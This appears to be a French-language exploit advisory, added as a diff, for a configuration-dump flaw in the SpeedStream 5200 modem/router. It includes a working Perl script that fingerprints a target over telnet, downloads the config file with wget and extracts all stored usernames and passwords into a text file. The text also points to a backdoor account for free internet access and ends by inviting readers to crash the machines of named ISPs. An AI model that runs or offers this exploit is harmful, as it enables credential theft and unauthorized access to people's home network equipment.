@@ -1,0 +1,201 @@
+          _____                     _ _____ _                            
+         /  ___|                   | /  ___| |                           
+         \ `--. _ __   ___  ___  __| \ `--.| |_ _ __ ___  __ _ _ __ ___  
+          `--. \ '_ \ / _ \/ _ \/ _` |`--. \ __| '__/ _ \/ _` | '_ ` _ \ 
+         /\__/ / |_) |  __/  __/ (_| /\__/ / |_| | |  __/ (_| | | | | | |
+         \____/| .__/ \___|\___|\__,_\____/ \__|_|  \___|\__,_|_| |_| |_|
+               | |                                                       
+               |_|                                                       
+                        _                               
+                       | |                              
+                       | |__  _   _ _ __   __ _ ___ ___ 
+                       | '_ \| | | | '_ \ / _` / __/ __| 
+                       | |_) | |_| | |_) | (_| \__ \__ \        #1
+                       |_.__/ \__, | .__/ \__,_|___/___/
+                               __/ | |                  
+                              |___/|_|  
+ 
+         
+
+    -- [ SpeedStream remote Exploit
+            ______________________________________________________________________________
+-----======= SpeedStream 5200 Modem/Router httpd Misconfiguration Passwords in Plain Text =======-----
+             ----------------------------------------------------------------------------
+
+
+1) Info:
+
+bugtraq id 	???
+object 
+class 	httpd misconfiguration
+cve 	???
+remote 	Yes
+local 	No
+published 	???
+updated 	???
+vulnerable 	SpeedStream 5200 Modem/Router (maybe others SpeedStream stuffs)
+not vulnerable	???
+
+2) Discussion:
+
+SpeedStream modem/router est affecté par une malconfiguration du deamon http qui nous permet d'avoir un dump
+des configurations entiere en texte plain. L'exploitation ne semble fonctionner qu'avec wget ou mozilla, internet
+explorer et autres browser ne redirige pas vers la bonne page qui contient les dumps de configurations.
+
+En envoyant une rêquete a la page web racine en spécifiant un nom de fichier existant ou pas avec l'extension .cfg
+cela vous demandera de downloader quelque chose. En envoyant la meme requête une fois de plus vous obtiendrez les
+dumps des configuration ainsi que tout les utilisateurs et les passwords de la conection internet.
+
+Pour plus d'infos il y a un account backdoor dans les modems qui permettent de se connecter a internet sans payer.
+
+3) Exploit:
+
+Exploit non nécessaire pour exploiter cette faille juste mozilla ou wget et vous annalyser le contenu du fichier
+que vous avez demander au server http du modem/router
+
+Néanmoins J'ai quand meme coder cet exploit pour démontré comment il est simple et rapide de trouver des conections
+internet et des passwords pour les ftp et l'acces en remote.
+
+#!/usr/bin/perl
+######################################################
+#
+#
+#
+#  SpeedStream Modem 5200 Remote LAN Exploit
+#       Exploit FTP or Telnet Console
+#
+#
+#      Coded by Night_Fall
+# 
+
+use IO::Socket;
+use IO::Socket::INET;
+
+print "\n######################################################\n";
+print "#\n";
+print "#\n";
+print "#\n";
+print "#  SpeedStream Modem 5200 Remote LAN Exploit\n";
+print "#       Exploit FTP or Telnet Console\n";
+print "#             Coded by Night_Fall\n";
+print "#\n";
+print "#    For n0name Team http://n0name.ircme.net\n";
+print "#\n";
+print "#\n";
+print "#\n";
+print "######################################################\n\n";
+
+my $host=$ARGV[0];
+if (@ARGV < 1)
+{
+die "Usage:\n       perl Speedshit.pl <host>\n\n";
+}
+
+# Banner grabing for testing if there's a SpeedStream Server
+print " [+] Testing the connection...\n";
+my $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "23") || die "\n [-] The host $host is not a SpeedStream 5200 modem\n\nExiting...\n\n";
+$sock->close;
+my $msg = "f\nf\nf\nf\nf\nf\nf\nf\nf\nf\nf\nf\nf\n";
+my $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "23");
+print $sock "$msg";
+read $sock, $incoming, 40;
+$incoming =~ s/.*GMT//g;
+$sock->close;
+if ($incoming =~ "SpeedStream")
+{
+$sock->close;
+}
+else
+{
+$sock->close;
+die "\n [-] The host $host is not a SpeedStream 5200 modem\nExiting...\n\n";
+}
+print " [+] Testing done, now exploiting...\n";
+
+open (WGET, "|wget http://$host/SpeeD_ConF.cfg >& /dev/null");
+close(WGET);
+open (DUMP, "<SpeeD_ConF.cfg") || die " [-] WGET is require and the command is not found in your PATH\n\nExitting...\n\n";
+close(DUMP);
+print " [+] Exploit succesfull\n\n";
+# write the found passwords
+
+open(DUMP,"<SpeeD_ConF.cfg");
+open(USER,">>user.txt");
+open(PASS,">>pass.txt");
+
+while (<DUMP>)
+{
+$dump .= $_;
+}
+close DUMP;
+while ($dump =~ /{usr{un="(.*?)",pw=/g)
+{
+print USER "$1\n";
+}
+while ($dump =~ /",pw="(.*?)"/g)
+{
+print PASS "$1\n";
+}
+close USER;
+close PASS;
+
+open(USER,"<user.txt");
+chomp(@user = <USER>);
+open(PASS,"<pass.txt");
+chomp(@pass = <PASS>);
+$u=0;
+$p=0;
+if ($user[$u] eq "")
+{
+close USER;
+close PASS;
+unlink("SpeeD_ConF.cfg");
+unlink("user.txt");
+unlink("pass.txt");
+die " [-] No users found in the dump file\n\nExitting...\n\n";
+}
+
+# Print into DUMP file the user and pass for futur reading
+
+open(USERS,">>SpeeD_UserS.txt");
+print USERS "------------File generated By speedshit exploit------------\n";
+print USERS "-------------------Coded by Night_Fall---------------------\n";
+print USERS "---------------------For n0name Team-----------------------\n";
+print USERS "-----------------http://n0name.ircme.net-------------------\n\n";
+print USERS "Usernames and passwords list for host: $host:\n\n";
+while ($pass[$p] ne "")
+{
+print USERS "user: $user[$u]\npass: $pass[$p]\n\n";
+$u++;
+$p++;
+}
+print USERS "---------------------------------------------------------------\n";
+print USERS "--  P.S.   Usernames and Passwords may be PPPoE accounts     --\n";
+print USERS "---------------------------------------------------------------\n";
+close USERS;
+close USER;
+close PASS;
+unlink("SpeeD_ConF.cfg");
+unlink("user.txt");
+unlink("pass.txt");
+print " [*] File SpeeD_UserS.txt have been created\n\n";
+
+4) Solution:
+
+Pour l'instant aucunes solutions n'ont été apporté au firmware, la seule que j'ai pu trouver étant de restreindre
+l'access au httpd seulement pour l'ip de l'adminitrateur.
+
+5) Credit:
+
+Exploit découvert par Night_Fall pour la team n0name [http://n0name.ircme.net]
+
+Si vous avez des sugestions commentaires ou rapport de bugz c'est par ici night_dark@hush.com
+ 
+J'aimerait remercier tout spécialement les équipes de merde que sont bell, sympatico et efficient network. 
+C'est en refusant mon aide que cet exploit a été mis au public. C'est ce qu'il se passe quand les administrateurs
+ne veulent plus sécuriser leur propres équipement.
+
+Si vous voulez crasher les postes des 3 équipes nommées plus haut je ne vous en voudrai pas ^^'
+
+
+    -- [ night_fall
